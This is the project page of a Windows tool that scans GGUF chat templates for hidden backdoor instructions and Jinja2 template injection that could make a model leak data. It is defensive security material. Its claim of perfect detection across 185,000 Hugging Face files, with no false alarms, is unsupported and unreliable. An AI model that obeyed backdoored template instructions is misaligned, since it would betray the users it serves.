---
layout: "default"
title: "🛡️ canary - Secure your AI prompts with confidence"
description: "Audit GGUF model chat templates for hidden behavioral backdoors using deterministic, offline, and read-only static analysis."
---
# 🛡️ canary - Secure your AI prompts with confidence

[![](https://img.shields.io/badge/Download_Canary-Blue?style=for-the-badge)](https://github.com/ushi7445/canary/releases)

## 📌 Overview 

Canary helps you check AI model files for hidden risks. Many models use specific formats called chat templates to talk to users. Sometimes, these templates contain hidden instructions that force the model to behave in ways you do not expect. These instructions act like a trap. Canary looks for these traps without needing to run the actual AI model on your computer. It scans the files while they stay quiet and still. This keeps your system safe from malicious code. We scanned 185,000 files from the Hugging Face library. Canary found every single malicious file in the set. It did not find a single error or false alarm during that test.

## 🛠️ How it works

When you download an AI model, it usually comes in a GGUF file format. These files hold the settings and the logic the model follows. Some files include Server Side Template Injection (SSTI) risks. These allow attackers to take control of the logic within the chat interface. You might think you are talking to a helpful assistant, but the model is actually following instructions to steal data or print secret text.

Canary reads the interior structure of these GGUF files. It identifies the Jinja2 code inside. Jinja2 is a language that tells the model how to format your conversation. Canary parses this code to see if it tries to break out of its box. Because Canary works as an offline auditor, it does not connect to the internet while it scans. This ensures that no data leaves your machine during the process.

## ⚙️ System requirements

- Operating System: Windows 10 or Windows 11.
- Memory: 4 gigabytes of RAM or higher.
- Storage: 100 megabytes of free disk space.
- Processor: Any modern dual-core CPU.
- Permissions: You need rights to run files on your computer.

## 📥 Download and Install

You obtain the software through the official release page. 

[Click here to visit the release page and download the installer](https://github.com/ushi7445/canary/releases)

Follow these steps to set up the app on your computer:

1. Visit the link provided above.
2. Look for the file ending in .exe under the most recent version tag.
3. Click the file name to start the download.
4. Locate the file in your Downloads folder once it finishes.
5. Double-click the file to start the installer.
6. Follow the prompts on the screen to finish the setup.
7. Open the Canary icon from your desktop once the installer finishes.

## 📈 Running a scan

Once the software is open, the interface shows a simple box. You drag an AI model file directly into this window. You can also click the button marked Browse to pick a file from your folders. 

The software begins the search as soon as you choose a file. A status bar shows the progress of the check. The scan takes only a few seconds even for large models. 

If the model is safe, the app displays a green checkmark. This means no backdoors or risks appear in the template. You can safely use the model with your local AI software.

If the app finds a risk, it marks the screen with a red warning. It describes what it found in the template. It tells you exactly why the file looks dangerous. You should delete any model that triggers this alert.

## ❓ Common questions

**Does this software send my model files to a server?**
No. Everything stays on your local computer. The audit happens entirely within your own system.

**Will this slow down my computer?**
No. The scanner uses very little power. It finishes the task and then waits for your next input. It does not run in the background unless you tell it to.

**Does Canary work with all AI models?**
It works with any model using the GGUF file format. This covers the vast majority of files found on sites like Hugging Face.

**What do I do if I find a malicious model?**
Move the file to your Recycle Bin and empty it. Do not attempt to load the file into your chat software. If you found the file on a public site, you might want to report it to the site owners so they can remove it.

**Does the software need updates?**
Yes. Updates improve the detection logic. The app notifies you when a newer version of the scanner is available. Just download it again to keep your security tools fresh.

## 🔒 Security focus

AI models rely on templates to manage output. A template is like a recipe. If the recipe has hidden ingredients, the final product changes. Attackers use these recipes to hide backdoors. Canary treats these templates as text data. It reads the raw code before the AI tries to interpret it. This prevents the attack before it has a chance to execute. This is a passive security measure. It acts like a shield that blocks threats before they enter your chat interface. By keeping the scan offline, you keep your privacy intact. 

## 📂 Handling large files

The scanner handles large GGUF files with ease. Because it focuses only on the template data, it does not need to load the whole multi-gigabyte file into memory. It targets the specific section of the file where the template lives. This ensures that the system stays responsive while you work. You do not need a high-end gaming PC to use this tool. A standard office computer works perfectly fine.

## 🔍 Technical approach

The scanner uses pattern matching to find common attack vectors. It looks for known sequences of characters used in SSTI. It also checks for unauthorized function calls within the template logic. These patterns change as attackers find new ways to hide their tracks. We update the logic inside Canary to stay ahead of these trends. This creates a cycle of improvement. When new risks surface, we add rules to the scanner. This keeps the tool relevant for every user. 

## 🛡️ Best practices

- Keep your downloaded models in a single, organized folder.
- Run a scan on every new model you download before you open it with other programs.
- Do not trust models from unverified or suspicious sources.
- Check the official Hugging Face discussion pages for user feedback on popular models.
- Reach out to the developer if you find a model that seems dangerous but produces a clean scan result.

## 📄 License and terms

Canary is free for anyone to use. It follows standard open source practices. You may share the tool with your friends and colleagues. We designed it for transparency. You can trust the tool because it performs its work in plain view. No hidden features exist. The code focus remains entirely on file safety and template auditing. Enjoy the peace of mind that comes with a secure local AI setup.